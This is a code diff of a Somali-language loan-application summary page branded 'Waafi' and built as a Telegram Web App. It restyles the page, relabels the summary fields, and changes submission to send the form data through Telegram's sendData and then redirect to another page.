@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Codsiga Amaahda - Step 3</title>
+    <title>Codsiga Amaahda - Summary</title>
 
-    <!-- Telegram SDK FIXED -->
+    <!-- ✅ FIXED Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -13,7 +13,6 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #f8f9fa;
             margin: 0;
-            padding: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -30,8 +29,10 @@
             box-sizing: border-box;
         }
 
-        .back-link { font-size: 22px; font-weight: 500; cursor: pointer; }
-        .waafi-logo { font-size: 24px; font-weight: bold; }
+        .waafi-logo {
+            font-size: 24px;
+            font-weight: bold;
+        }
 
         .form-card {
             background: white;
@@ -44,14 +45,46 @@
             box-sizing: border-box;
         }
 
-        h2 { text-align: center; margin: 0; font-size: 26px; color: #333; font-weight: 600; }
-        .step-info { text-align: center; font-size: 15px; color: #888; margin: 10px 0 25px; }
+        h2 {
+            text-align: center;
+            margin: 0;
+            font-size: 26px;
+            color: #333;
+            font-weight: 600;
+        }
 
-        .progress-box { display: flex; gap: 8px; margin-bottom: 35px; }
-        .bar { height: 4px; flex: 1; background: #82d13d; border-radius: 2px; }
+        .step-info {
+            text-align: center;
+            font-size: 15px;
+            color: #888;
+            margin: 10px 0 25px;
+        }
 
-        .input-wrap { margin-bottom: 22px; }
-        label { display: block; font-size: 16px; font-weight: 500; margin-bottom: 10px; color: #333; }
+        .progress-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 35px;
+        }
+
+        .bar {
+            height: 4px;
+            flex: 1;
+            background: #82d13d;
+            border-radius: 2px;
+        }
+
+        .input-wrap {
+            margin-bottom: 22px;
+        }
+
+        label {
+            display: block;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
         select, input {
             width: 100%;
             padding: 15px;
@@ -59,7 +92,6 @@
             border-radius: 8px;
             font-size: 17px;
             box-sizing: border-box;
-            color: #333;
             background: #fff;
         }
 
@@ -74,18 +106,28 @@
         .summary-box h3 {
             margin: 0 0 15px 0;
             font-size: 18px;
+            font-weight: 700;
         }
 
         .summary-item {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             border-bottom: 1px solid #eee;
             padding-bottom: 8px;
         }
 
-        .summary-label { color: #666; }
-        .summary-value { font-weight: 600; }
+        .summary-label {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .summary-value {
+            font-weight: 600;
+            font-size: 14px;
+            color: #000;
+            text-align: right;
+        }
 
         .btn-container {
             display: flex;
@@ -94,13 +136,15 @@
         }
 
         .back-btn {
-            background: #f1f1f1;
-            border: 1px solid #ddd;
+            background: #b0b0b0;
+            color: white;
+            border: none;
             padding: 16px;
             border-radius: 10px;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
+            text-transform: uppercase;
         }
 
         .submit-btn {
@@ -112,13 +156,14 @@
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
+            text-transform: uppercase;
         }
 
         .footer-text {
             text-align: center;
             font-size: 13px;
             color: #aaa;
-            margin-top: 40px;
+            margin: 40px 0 30px;
         }
     </style>
 </head>
@@ -126,7 +171,7 @@
 <body>
 
 <div class="nav-header">
-    <div class="back-link" onclick="goBack()">← Dib u noqo</div>
+    <div onclick="goBack()" style="cursor:pointer; font-size:20px;">← Dib u noqo</div>
     <div class="waafi-logo">Waafi</div>
     <div style="font-size: 26px;">☰</div>
 </div>
@@ -154,36 +199,36 @@
 
     <div class="input-wrap">
         <label>Dakhliga Sanadka ($)</label>
-        <input type="text" id="income" placeholder="25000">
+        <input type="text" id="income" placeholder="Tusaale: 25000">
     </div>
 
     <div class="summary-box">
         <h3>Soo koobidda Codsiga</h3>
 
         <div class="summary-item">
-            <span class="summary-label">Qaddarka:</span>
-            <span class="summary-value" id="sumAmount"></span>
+            <span class="summary-label">Qaddarka Amaahda:</span>
+            <span class="summary-value" id="sumAmount">--</span>
         </div>
 
         <div class="summary-item">
-            <span class="summary-label">Muddada:</span>
-            <span class="summary-value" id="sumDuration"></span>
+            <span class="summary-label">Muddada Amaahda:</span>
+            <span class="summary-value" id="sumDuration">--</span>
         </div>
 
         <div class="summary-item">
             <span class="summary-label">Ujeedada:</span>
-            <span class="summary-value" id="sumPurpose"></span>
+            <span class="summary-value" id="sumPurpose">--</span>
         </div>
 
         <div class="summary-item">
-            <span class="summary-label">Magaca:</span>
-            <span class="summary-value" id="sumName"></span>
+            <span class="summary-label">Codsade:</span>
+            <span class="summary-value" id="sumName">--</span>
         </div>
     </div>
 
     <div class="btn-container">
-        <button class="back-btn" onclick="goBack()">KA HORE</button>
-        <button class="submit-btn" onclick="submitForm()">DIR CODSIGA</button>
+        <button type="button" class="back-btn" onclick="goBack()">KA HORE</button>
+        <button type="button" class="submit-btn" onclick="submitForm()">DIR CODSIGA</button>
     </div>
 </div>
 
@@ -191,9 +236,15 @@
 
 <script>
 window.onload = () => {
-    const amount = localStorage.getItem('amount') || "";
-    const duration = localStorage.getItem('loanDuration') || "";
-    const purpose = localStorage.getItem('loanPurpose') || "";
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();   // ✅ important
+        tg.expand();
+    }
+
+    const amount = localStorage.getItem('amount');
+    const duration = localStorage.getItem('loanDuration');
+    const purpose = localStorage.getItem('loanPurpose');
     const fName = localStorage.getItem('firstName') || "";
     const lName = localStorage.getItem('lastName') || "";
 
@@ -201,12 +252,6 @@ window.onload = () => {
     document.getElementById('sumDuration').innerText = duration || "--";
     document.getElementById('sumPurpose').innerText = purpose || "--";
     document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
-
-    const tg = window.Telegram?.WebApp;
-    if (tg) {
-        tg.ready();
-        tg.expand();
-    }
 };
 
 function submitForm() {
@@ -225,16 +270,17 @@ function submitForm() {
 
     if (tg && tg.sendData) {
         tg.sendData(JSON.stringify(data));
-        tg.close();
+        setTimeout(() => {
+            window.location.href = "/page5";
+        }, 500);
     } else {
-        alert("Codsiga waa la diray!");
-        console.log(data);
-        localStorage.clear();
+        console.log("Submitted:", data);
+        window.location.href = "/page5";
     }
 }
 
 function goBack() {
-    window.history.back();
+    window.location.href = "/page3";
 }
 </script>
 
